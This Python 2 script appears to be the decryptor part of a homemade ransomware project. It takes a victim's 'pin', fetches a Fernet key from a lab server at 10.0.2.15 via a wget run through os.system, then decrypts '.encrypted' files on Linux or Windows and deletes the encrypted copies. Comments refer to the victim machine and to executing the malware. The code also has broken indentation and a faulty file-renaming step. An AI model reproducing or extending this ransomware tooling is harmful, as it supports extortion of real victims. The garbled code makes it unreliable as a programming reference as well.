#! usr/bin/python
# This is a decryption tool to revert back all the encrypted data to original form../
# it simply deactivate the function of the ransomware virus...../ when provided the correct pin from authenticated user../only //

import os
import sys
import socket

import subprocess 
from sys import platform 
# cryto modules import ..../
from cryptography.fernet import Fernet 
auth_pin = raw_input("Please enter the 15 digit pin to recover the infected files")

mainvar = auth_pin+".key"

print "You entered pin : " +auth_pin
get_cmd = "wget http://10.0.2.15/Keys/"+mainvar
hide_cmd = os.system(get_cmd) # in verbose mode...erxecution of code ..

try:
	
	file = open(mainvar,"rb")
	key = file.read() # stroing the opened .key  file data into the variable 
	file.close()

except:
	
	print "The entered pin was incorrect."
	print "Shutting down the application..."
	sys.exit(1)


def filelist_linux():
	
	mylist = []
	# collecting all the affected files in the array declared 
	for root,dirs,files in os.walk("/root/Desktop"): # temp arg showing unix file system .../
		for file in files:
			
			if file.endswith(".encrypted"):
				mylist.append(os.path.join(root, file))

	return mylist
# this will print all the files returned in the array list mylist[]../	 
#rint(filelist())
# storing ...
#enc_files = filelist()


def filelist_windows():
	
	mylist = []
	# collecting all the affected files in the array declared 
	for root , dirs,files in os.walk("c:/"): # not final , argument in walk function is temporary for showing windows file system pattern 
		for file in files:
			if file.endswith(".encrypted"):
				mylist.append(os.path.join(root, file))

	return mylist

# checking the target pc's operating system 
# function for decryption >>>>time to get ... 

def file_decrypt(key, files):
    
    for name in files:
        if (name!="Ransom_decrypt.py"): 
            with open(name,'rb') as f:
                data = f.read()

            fernet = Fernet(key)
            decrypted = fernet.decrypt(data)
            # replaced the encrypted extension after the file is decrypted 
	    import string
            decrypted_file = name + ".decrypted"
		
	    original_file = decrypted_file.replace(".decrypted.encrypted" , " ")
            # After decryption all the files will have the .decrypted in the end
            # so , rename the file by removing this string "decrypted from the every file extension../"
            try:
		# try opening the file to write the decrypted data....again to revert back to original content ..
                with open(original_file, 'wb') as f:
                    f.write(decrypted)
                    os.remove(name)
            except:
		
                continue
print "Deactivating the Malware execution....."
#file_decrypt(key, enc_files)

def banner():

	print " "
	print " "
	print "!!!!!!!!!!!!!!!! YOUR ALL THE FILES HAVE BEEN SUCCESSFULLY DECRYPTED TO THEIR ORIGINAL FORM  !!!!!!!!!!!!!!!!!"
# code ends ..//.../::))///

# this function is entry point calling function first checks the os, platform then executes the malware in accordance with the 
#  filesystem it founds on the victim machine ....

def OS_check_toDecrypt():

	#global enc_files # global var as can be used outside the function block .. in decrytion function 
	from sys import platform 
	if platform == "linux" or platform == "linux2":
		filelist_linux()
		print(filelist_linux())
		enc_files = filelist_linux() # storing all the encrypted linux system files into the enc_files variable..

		file_decrypt(key, enc_files)
 	#	if file_decrypt(key, enc_files):
 		banner()

	elif platform == "win32":

		filelist_windows()
		print(filelist_windows())
		enc_files = filelist_windows()

		file_decrypt(key, enc_files)
	#	if file_decrypt(key, enc_files):
		banner()
# calling entry  point function .././
OS_check_toDecrypt() # would start the process of decryption ../ 
#  code ends here.././././--->>>/

